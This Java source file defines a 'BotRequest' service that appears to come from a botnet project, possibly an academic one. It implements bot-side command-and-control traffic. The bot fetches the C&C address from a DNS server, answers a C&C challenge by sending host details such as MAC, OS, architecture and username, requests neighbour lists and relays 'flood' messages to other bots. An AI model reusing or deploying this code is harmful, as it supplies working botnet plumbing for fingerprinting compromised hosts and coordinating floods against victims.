package cs.sii.network.request;

import java.io.UnsupportedEncodingException;
import java.security.InvalidAlgorithmParameterException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.security.PublicKey;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.concurrent.Future;

import javax.crypto.BadPaddingException;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.scheduling.annotation.Async;
import org.springframework.scheduling.annotation.AsyncResult;
import org.springframework.stereotype.Service;
import org.springframework.web.client.RestTemplate;

import cs.sii.domain.IP;
import cs.sii.domain.Pairs;
import cs.sii.service.crypto.CryptoPKI;

@Service("BotRequest")
public class BotRequest {

	private static final int WAIT_RANGE = 1000;

	private static final String PORT = ":8443";

	private static final String HTTPS = "https://";
	private static final String HTTP = "http://";

	public final static Integer REQNUMBER = 10;

	private static final int TIMEOUT_MILLIS = 600000;

	@Autowired
	private RestTemplate restTemplate;

	private Integer timeoutSeconds;

	@Autowired
	private CryptoPKI pki;

	public BotRequest() {
	}

	// response = restTemplate.postForObject(url, obj, response.getClass());

	@Async
	public Future<String> pingUser(String ipBot) {
		Integer counter = 0;
		while (counter <= REQNUMBER) {
			try {
				System.out.println("\nRichiesta ad :" + ipBot);
				String response = restTemplate.postForObject("http://" + ipBot + "/bot/ping", null, String.class);
				return new AsyncResult<>(response);
			} catch (Exception e) {
				// e.printStackTrace();
				System.out.println("\nSono Morto: " + ipBot + " Causa: " + e.getMessage());
				counter++;
				// Aspetto prima della prossima richiesta
				try {
					Thread.sleep(WAIT_RANGE);
				} catch (InterruptedException ex) {
					System.err.println("Errore sleep" + ex);
					ex.printStackTrace();
				}
			}
		}
		return null;
	}

	@Async
	public Future<Pairs<IP, Integer>> esempioRichiesta(String uriMiner) {
		String result = "";
		Integer level = -1;
		Integer counter = 0;
		while (counter <= REQNUMBER) {
			try {
				System.out.println("\nRichiesta ad :" + uriMiner);
				// result = restTemplate.getForObject("http://" + uriMiner +
				// "/fil3chain/updateAtMaxLevel", String.class);
				result = restTemplate.getForObject("http://" + uriMiner + "/fil3chain/updateAtMaxLevel",
						result.getClass());
				level = Integer.decode(result);
				System.out.println("Chain Level" + level);
				return new AsyncResult<>(new Pairs<>(new IP(uriMiner), level));
			} catch (Exception e) {
				// e.printStackTrace();
				System.out.println("\nSono Morto: " + uriMiner + " Causa: " + e.getMessage());
				counter++;
			}
			try {
				Thread.sleep(WAIT_RANGE);
			} catch (InterruptedException e) {
				e.printStackTrace();
			}
		}
		return null;
	}

	/**
	 * @param iPCeC
	 * @param ipBot
	 * @param iDBot
	 */

	public ArrayList<String> askNeighbours(String iPCeC, String ipBot, String data) {
		 ArrayList<String> result = new ArrayList<String>();
		Integer counter = 0;
		String encryptData="";
		try {
			// richiesta del vicinato
			encryptData = pki.getCrypto().encryptAES(data);
		} catch (InvalidKeyException | NoSuchAlgorithmException | NoSuchPaddingException | UnsupportedEncodingException
				| InvalidAlgorithmParameterException | IllegalBlockSizeException | BadPaddingException e) {
			System.out.println("failed to encrypt data during initialize");
			e.printStackTrace();
		}
		while (counter <= REQNUMBER) {
			try {
				String url=HTTPS+ iPCeC + PORT+"/cec/neighbours";
				System.out.println("Richiesta Vicinato a "+url);
				result.addAll(	Arrays.asList(restTemplate.postForObject(url, encryptData, String[].class)));
				System.out.println("ritorna "+result);
				return result;
			} catch (Exception e) {
				counter++;
			}
			try {
				Thread.sleep(WAIT_RANGE);
			} catch (InterruptedException e) {
				e.printStackTrace();
			}
		}
		return null;
	}

	// da valutare se devono essere asincroni
	public Pairs<String, String> getIpCeCFromDnsServer(String dnsUrl) {
		Pairs<String, String> cec = new Pairs<>();
		while (true) {
			try {
				System.out.println("url request " + dnsUrl);
				String url = HTTP + dnsUrl;
				//Type type=new TypeToken<Pairs<IP,String>>(){}.getType();
				// TODO capire se la richiesta è fatta bene
//				cec = restTemplate.getForObject(url,Pairs.class);
				cec = restTemplate.postForObject(url, null, cec.getClass());
				return cec;
			} catch (Exception e) {
				System.err.println("Errore ricezione Ip da Mock Dns Server" + e);
				try {
					Thread.sleep(WAIT_RANGE);
				} catch (InterruptedException ex) {
					System.err.println("Errore sleep" + e);
					ex.printStackTrace();
				}
			}
		}
	}
	
	@Async
	public Boolean sendFloodToOtherBot(String ipBot,String msg) {
		Boolean response=false;
		Integer count=0;
		while (count<REQNUMBER) {
			try {
				String url = HTTPS + ipBot + PORT + "/bot/flood";
				System.out.println("url bot flood" + url);
				response = restTemplate.postForObject(url, msg, response.getClass());
				return response;
			} catch (Exception e) {
				// e.printStackTrace();
				System.out.println("Errore invio richiesta flood");
				try {
					count++;
					Thread.sleep(WAIT_RANGE);
				} catch (InterruptedException ex) {
					ex.printStackTrace();
				}
			}
		}
		return response;
	}
	

	// da valutare se devono essere asincroni
	public Pairs<Long, Integer> getChallengeFromCeC(String idBot, IP ipCeC) {

		Pairs<Long, Integer> response = new Pairs<>();
		Integer counter = 0;
		while (true) {
			try {
				String url = HTTPS + ipCeC + PORT + "/cec/welcome";
				System.out.println("url challenge request " + url);
				response = restTemplate.postForObject(url, idBot, response.getClass());
				return response;
			} catch (Exception e) {
				// e.printStackTrace();
				counter++;
				System.out.println("Errore ricezione Challenge");
				try {
					Thread.sleep(WAIT_RANGE);
				} catch (InterruptedException ex) {
					ex.printStackTrace();
				}
			}
		}
	}

	
	
	
	
	// da valutare se devono essere asincroni
	/**
	 * @param idBot
	 *            botdata
	 * @param ip
	 *            botdata
	 * @param Mac
	 *            botdata
	 * @param os
	 *            botdata
	 * @param vers
	 *            botdata
	 * @param arch
	 *            botdata
	 * @param usrName
	 *            botdata
	 * @param dest
	 *            destinatio ip of request
	 * @param hashMac
	 *            mac to be verified
	 * @param elegible
	 * @return
	 */
	public String getResponseFromCeC(String idBot, IP ip, String Mac, String os, String vers, String arch,
			String usrName, IP dest, String hashMac, PublicKey pk, boolean elegible) {
		Integer counter = 0;
		String response = "";
		while (true) {// (counter <= REQNUMBER) {
			// Type type=new TypeToken<Pairs<Long,Integer>>(){}.getType();
			// String postRequest = "{\"hashMac\":\""+hashMac+"\"}";
			try {
				// response = doPost("http://"+ip+":8080/welcome/hmac",
				// hashMac);
				// RestTemplate rest=new RestTemplate();

				List<Object> objects = new ArrayList<Object>();
				objects.add(idBot);
				objects.add(ip.toString());
				objects.add(Mac);
				objects.add(os);
				objects.add(vers);
				objects.add(arch);
				objects.add(usrName);
				objects.add(hashMac);
				objects.add(pki.demolishPuK(pk));
				objects.add(elegible);
				response = restTemplate.postForObject(HTTPS + dest + PORT + "/cec/hmac", objects, String.class);
				System.out.println("Ok");
				return response;
			} catch (Exception e) {
				// e.printStackTrace();
				System.out.println("response:   " + response);
				System.out.println("Errore risoluzione Hmac con CeC");
				counter++;
				try {
					Thread.sleep(WAIT_RANGE);
				} catch (InterruptedException ex) {
					ex.printStackTrace();
				}
			}
		}
	}

	public String askMyIpToAmazon() {
		String amazing = "http://checkip.amazonaws.com/";
		String response = "";
		while (true) {
			try {
				response = restTemplate.getForObject(amazing, response.getClass());
				return response;
			} catch (Exception e) {
				System.out.println("no internet");
				try {
					Thread.sleep(WAIT_RANGE);
				} catch (InterruptedException ex) {
					ex.printStackTrace();
				}
				e.printStackTrace();
			}
		}
	}

	// public static String doGet(String url) throws Exception {
	//
	// // HttpPost request = new HttpPost(url);
	//
	// HttpGet request = new HttpGet(url);
	//
	// RequestConfig requestConfig =
	// RequestConfig.custom().setSocketTimeout(TIMEOUT_MILLIS)
	// .setConnectTimeout(TIMEOUT_MILLIS).setConnectionRequestTimeout(TIMEOUT_MILLIS).build();
	//
	// request.setConfig(requestConfig);
	//
	// HttpClient client = HttpClientBuilder.create().build();
	//
	// HttpResponse response;
	// response = client.execute(request);
	// BufferedReader rd;
	// rd = new BufferedReader(new
	// InputStreamReader(response.getEntity().getContent()));
	// StringBuffer result = new StringBuffer();
	// String line = "";
	// while ((line = rd.readLine()) != null) {
	// result.append(line);
	// }
	// return result.toString();
	// }

	// public static String doPost(String url, String raw_data) throws Exception
	// {
	//
	// HttpClient client = HttpClientBuilder.create().build();
	// HttpGet request = new HttpGet(url);
	// HttpPost post = new HttpPost(url);
	// // List<NameValuePair> urlParameters = new ArrayList<NameValuePair>();
	// // for (Pairs<?, ?> p : parameters) {
	// // urlParameters.add(new BasicNameValuePair(p.getValue1().toString(),
	// // p.getValue2().toString()));
	// // }
	//
	// RequestConfig requestConfig =
	// RequestConfig.custom().setSocketTimeout(TIMEOUT_MILLIS)
	// .setConnectTimeout(TIMEOUT_MILLIS).setConnectionRequestTimeout(TIMEOUT_MILLIS).build();
	//
	// request.setConfig(requestConfig);
	//
	// post.setEntity(new StringEntity(raw_data));
	// HttpResponse response = client.execute(post);
	// BufferedReader rd;
	// rd = new BufferedReader(new
	// InputStreamReader(response.getEntity().getContent()));
	// StringBuffer result = new StringBuffer();
	// String line = "";
	// while ((line = rd.readLine()) != null) {
	// result.append(line);
	// }
	// return result.toString();
	// }
	//
	// @SuppressWarnings("unchecked")
	// public static <T> T doGetJSON(String url, Type t) throws IOException {
	//
	// HttpClient client = HttpClientBuilder.create().build();
	// HttpGet request = new HttpGet(url);
	//
	// RequestConfig requestConfig =
	// RequestConfig.custom().setSocketTimeout(TIMEOUT_MILLIS)
	// .setConnectTimeout(TIMEOUT_MILLIS).setConnectionRequestTimeout(TIMEOUT_MILLIS).build();
	//
	// request.setConfig(requestConfig);
	//
	// HttpResponse response;
	// response = client.execute(request);
	// BufferedReader rd;
	// rd = new BufferedReader(new
	// InputStreamReader(response.getEntity().getContent()));
	// StringBuffer result = new StringBuffer();
	// String line = "";
	// while ((line = rd.readLine()) != null) {
	// result.append(line);
	// }
	//
	// return Conversions.fromJson(result.toString(), t);
	// }

	public int getTimeoutSeconds() {
		return timeoutSeconds;
	}

	public void setTimeoutSeconds(int timeoutSeconds) {

		this.timeoutSeconds = timeoutSeconds;
	}

}
